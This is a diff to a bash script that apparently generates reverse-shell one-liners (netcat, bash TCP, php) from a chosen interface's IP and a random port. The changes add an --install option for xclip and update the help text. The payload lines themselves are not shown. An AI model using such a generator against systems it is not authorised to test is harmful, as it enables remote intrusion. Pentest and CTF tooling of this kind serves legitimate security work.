@@ -5,6 +5,10 @@ port=$((4444 + $RANDOM % 5555))
 margs=2
 
 # Common functions - BEGIN
+function install {
+  echo "[+] Installing requisite:"
+  sudo apt install xclip
+}
 function example {
     echo -e "Example: $script -i eth0 -s bash"
 }
@@ -16,16 +20,18 @@ function usage {
 function help {
     echo -e "\nREQUIREMENTS:"
     echo -e "This script requires xclip to function properly. If not present in the system, \
-install it with 'sudo apt install xclip' command\n"
+install it with 'sudo apt install xclip' command."
+  echo -e "You can use $script with the --install argument to install it.\n"
   usage
     echo -e "MANDATORY:"
     echo -e "  -i, --interface        The network iterface you wish to use"
     echo -e "  -s, --shell            The kind of shell you want to generate\n"
-    echo -e "OPTION:"
-    echo -e "  -h, --help             Prints this help\n"
+    echo -e "OPTIONAL:"
+    echo -e "  -h, --help             Prints this help"
+    echo -e "  --install              Install requisites\n"
     echo -e "SUPPORTED PARAMETERS:"
     echo -e "  eth0, tun0, ecc        Only active interfaces are supported"
-    echo -e "  nc, bash, php          Use nc for netcat shell, use bash for bash tcp shell\n"
+    echo -e "  nc, bash, php          Use nc for netcat shell, use bash for bash tcp shell, php for a php shell\n"
   example
 }
 
@@ -36,6 +42,9 @@ function margs_precheck {
   if [ $2 ] && [ $1 -lt $margs ]; then
     if [ $2 == "--help" ] || [ $2 == "-h" ]; then
       help
+      exit
+    elif [ $2 == "--install" ]; then
+      install
       exit
     else
         help
@@ -91,6 +100,7 @@ margs_check $marg0 $marg1
 # Shell function
 echo "[PORT] Port number: $port"
 ifconfig $marg0 | grep inet | awk '{print $2}' | head -n 1 > .ip.txt
+#cat .ip.txt #Test grabbed IP
 if [ "$marg1" = "bash" ]; then
     while read i; do exist=$i; done < .ip.txt;
       if [ -z "$exist" ]; then
